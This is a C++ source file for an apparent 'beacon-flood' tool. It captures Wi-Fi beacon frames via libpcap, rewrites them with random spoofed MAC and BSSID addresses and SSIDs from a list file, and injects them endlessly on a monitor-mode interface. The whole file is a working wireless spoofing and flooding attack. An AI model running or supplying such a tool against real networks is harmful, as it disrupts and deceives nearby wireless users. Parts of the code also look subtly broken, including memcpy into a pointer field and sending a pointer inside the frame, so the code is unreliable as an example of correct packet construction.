#include "main.h"
using namespace std;

#pragma pack(push, 1)
struct BeaconPacket final
{
    struct _ieee80211_radiotap_header radiotap_;
    struct _ieee80211_beacon_frame_header beacon_;
    struct _ieee80211_wireless_management_header wireless_;
};
#pragma pack(pop)

void usage()
{
    printf("syntax : beacon-flood <interface> <ssid-list-file>\n");
    printf("sample : beacon-flood mon0 ssid-list.txt\n");
}

typedef struct {
	char* dev_;
} Param;

Param param = {
	.dev_ = NULL
};

bool parse(Param* param, int argc, char* argv[])
{
	if (argc != 3) {
		usage();
		return false;
	}
	param->dev_ = argv[1];
	return true;
}

long getCurrentTime()
{
    struct timespec currentTime;
    clock_gettime(CLOCK_REALTIME, &currentTime);
    struct timespec epoch = {0};
    time_t epochSeconds = mktime(gmtime(&epoch.tv_sec));
    time_t currentSeconds = mktime(gmtime(&currentTime.tv_sec));
    long timestampDifference = (currentSeconds - epochSeconds) * 1000000L + (currentTime.tv_nsec - epoch.tv_nsec) / 1000L;

    return timestampDifference;
}

int main(int argc, char** argv)
{
    if (!parse(&param, argc, argv))
		return -1;
    
    vector<string> ssid_list;
    ifstream openFile(argv[2]);
    if(openFile.is_open())
    {
        string line;
        while(getline(openFile, line))
            ssid_list.push_back(line);
        openFile.close();
    }

	char errbuf[PCAP_ERRBUF_SIZE];
	pcap_t* pcap = pcap_open_live(param.dev_, BUFSIZ, 1, 1000, errbuf);
	if (pcap == NULL) {
		fprintf(stderr, "pcap_open_live(%s) return null - %s\n", param.dev_, errbuf);
		return -1;
    }

    int i = 0;
    unordered_map<int, uint8_t[6]> macMap;
    while(1)
    {
        if(i > ssid_list.size() - 1)
            i = 0;
        struct pcap_pkthdr* header;
		const u_char* packet;
		int res = pcap_next_ex(pcap, &header, &packet);
		if (res == 0) continue;
		if (res == PCAP_ERROR || res == PCAP_ERROR_BREAK) {
			printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(pcap));
			break;
		}  

        struct _ieee80211_radiotap_header* radiotap_hdr = (struct _ieee80211_radiotap_header*)packet;
		struct _ieee80211_beacon_frame_header* beacon_hdr = (struct _ieee80211_beacon_frame_header*)(radiotap_hdr->it_len + packet);
		struct _ieee80211_wireless_management_header* wireless_hdr = (struct _ieee80211_wireless_management_header*)(radiotap_hdr->it_len + sizeof(_ieee80211_beacon_frame_header) + packet);

		if(beacon_hdr->frame_control != 0x80)
			continue;

        struct BeaconPacket modifiedPacket;
        memcpy(&modifiedPacket.radiotap_, packet, sizeof(struct _ieee80211_radiotap_header));
        packet += sizeof(struct _ieee80211_radiotap_header);
        memcpy(&modifiedPacket.beacon_, packet, sizeof(struct _ieee80211_beacon_frame_header));

        if(!macMap.count(i))
        {
            for(int m = 0; m < 6; m++)
                macMap[i][m] = uint8_t(rand() % 256);
        }

        for(int m = 0; m < 6; m++)
        {
            modifiedPacket.beacon_.transmitter_address[m] = macMap[i][m];
            modifiedPacket.beacon_.bssid[m] = macMap[i][m];
        }

        struct _ieee80211_wireless_management_header modifiedWireless;
        modifiedWireless.timestamp = getCurrentTime();
        modifiedWireless.beacon_interval = 0x64;
        modifiedWireless.capabilities_information = 0x1511;
        modifiedWireless.tag_number = 0;

        size_t ssid_length = ssid_list[i].size();
        modifiedWireless.tag_length = ssid_list[i].size();
        modifiedWireless.ssid = (uint8_t*)malloc(ssid_length);
        if (modifiedWireless.ssid == nullptr)
        {
            fprintf(stderr, "Failed to allocate memory for SSID\n");
            break;
        }
        memcpy(&modifiedWireless.ssid, ssid_list[i].c_str(), ssid_length);
        memcpy(&modifiedPacket.wireless_, &modifiedWireless, sizeof(modifiedWireless));

        if (pcap_sendpacket(pcap, reinterpret_cast<const u_char*>(&modifiedPacket), sizeof(struct _ieee80211_radiotap_header) + sizeof(struct _ieee80211_beacon_frame_header) + sizeof(uint8_t) * (14 + modifiedWireless.tag_length)) != 0) {
            fprintf(stderr, "pcap_sendpacket failed - %s\n", pcap_geterr(pcap));
            break;
        }

        i++;
    }

    return 0;
}